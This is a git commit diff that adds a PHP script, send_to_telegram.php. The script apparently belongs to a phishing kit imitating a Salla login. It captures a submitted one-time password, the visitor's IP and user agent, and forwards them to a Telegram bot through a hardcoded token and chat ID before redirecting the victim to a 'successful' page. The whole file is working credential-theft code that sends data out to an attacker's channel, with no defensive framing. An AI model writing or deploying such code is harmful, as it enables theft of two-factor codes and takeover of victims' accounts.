02d61a7d8fc424a352345ff0ed09ff2c37d9d042
al3fryty2-glitch <al3fryty2@gmail.com>
2025-12-18 14:04:01 +0300

    sa

---
+++ send_to_telegram.php
@@ -0,0 +1,34 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+
+    $otp = $_POST['otp'];
+
+    $botToken = "8545364723:AAFoC4AoA5XQNQVVrLC66p5u-kUuvzg-GO0";
+    $chatId = "-7725069258";
+
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        $userIP = $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $userIP = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    } else {
+        $userIP = $_SERVER['REMOTE_ADDR'];
+    }
+
+    $userAgent = $_SERVER['HTTP_USER_AGENT'];
+
+    $message = "╭━─━≪ OTP Info ❄️ ≫─━━╮\n\n";
+    $message .= "Iتسجيل دخول سلةI\n\n";
+    $message .= "OTP: $otp\n\n";
+    $message .= "------------------------\n\n";
+    $message .= "IP Address: $userIP\n";
+    $message .= "User Agent: $userAgent\n\n";
+    $message .= "╰━─━≪ OTP Info ❄️ ≫─━━╯";
+
+    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
+    file_get_contents($url); // إرسال الطلب
+
+    // إعادة توجيه المستخدم
+    header("Location: /sa/successful");
+    exit();
+}
+?>
